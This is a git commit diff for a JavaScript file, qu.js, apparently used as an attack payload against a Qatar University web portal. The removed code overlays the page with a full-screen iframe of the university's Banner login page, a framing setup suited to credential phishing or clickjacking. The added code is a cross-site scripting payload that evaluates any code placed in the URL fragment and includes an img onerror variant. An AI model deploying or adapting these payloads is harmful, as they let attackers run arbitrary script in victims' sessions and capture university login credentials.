4b7061cf2d12331a9d1cb533471da3dc348503f4
Abdullah AlSolaiman <45393986+AbdullahAlSolaiman@users.noreply.github.com>
2022-05-15 12:11:40 +0300

    Update qu.js

--- qu.js
+++ qu.js
@@ -1,2 +1,2 @@
-window.addEventListener("load", myFunction);
-function myFunction(p1, p2) {document.getElementsByTagName('body')[0].innerHTML = `<iframe src="https://mybanner.qu.edu.qa/PROD/bwskalog.P_DispLoginNon" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>`;}
+'';var msgbox;if(location.hash){eval(location.hash.slice(1))}else{alert(1)}//<img src="xxx://" onerror="if(location.hash){eval(location.hash.slice(1))}else{alert(1)}">
+msgbox+1
